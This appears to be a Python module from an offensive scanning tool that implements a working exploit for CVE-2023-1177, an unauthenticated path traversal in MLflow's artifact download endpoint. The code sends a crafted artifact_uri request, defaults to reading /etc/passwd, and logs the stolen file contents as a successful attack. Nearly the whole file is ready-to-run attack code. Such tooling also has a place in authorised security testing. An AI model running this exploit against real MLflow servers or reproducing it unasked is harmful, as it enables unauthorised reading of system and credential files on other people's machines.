from requests import get

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient


class Auxiliary(AuxiliaryBaseClass):
    """
    CVE-2023-1177 — Unauthenticated path traversal / arbitrary file read in MLflow.

    MLflow's artifact download endpoint (``GET /api/2.0/mlflow-artifacts/artifacts``)
    does not sanitise the ``artifact_uri`` query parameter before resolving it on the
    local filesystem.  Supplying a ``../../../../`` traversal sequence lets an
    unauthenticated attacker read arbitrary files from the server.

    Affected versions: MLflow < 2.2.1
    Fixed in: 2.2.1
    CVSS: 9.8 (Critical)
    """

    _client_class = MLflowClient
    _DEFAULT_PATH = "/etc/passwd"

    def trigger_vuln(
        self,
        base_url: str,
        f_path: str,
        headers: dict[str, str] | None = None,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """
        Issue the traversal request against the artifact download endpoint.

        Returns a (status_code, response_body) tuple, or None on network error.
        """
        client = self._build_client(base_url=base_url, proxies=proxies)
        endpoint = "/api/2.0/mlflow-artifacts/artifacts"
        params = {"artifact_uri": f_path}

        try:
            resp = get(
                client.base_url + endpoint,
                params=params,
                headers=headers or {},
                timeout=client.timeout,
                proxies=client.proxies,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error during traversal attempt: {e!s}")
            return None

        return resp.status_code, resp.text

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        path = self._DEFAULT_PATH
        self.logger.info("Probing CVE-2023-1177 (unauthenticated path traversal)...")

        if f_path is not None:
            path = f_path

        self.logger.info(f"Attempting traversal: {base_url}")
        result = self.trigger_vuln(base_url=base_url, f_path=path, proxies=proxies)

        if result is None:
            return False

        status, body = result
        if status == 200 and body:
            self.logger.info(
                f"Attack successful! Retrieved {len(body)} bytes via path traversal."
            )
            self.logger.info(f"Results:\n{body}")
            return True

        self.logger.warning(
            "CVE-2023-1177: all traversal attempts failed — target may be patched or misconfigured."
        )
        return False
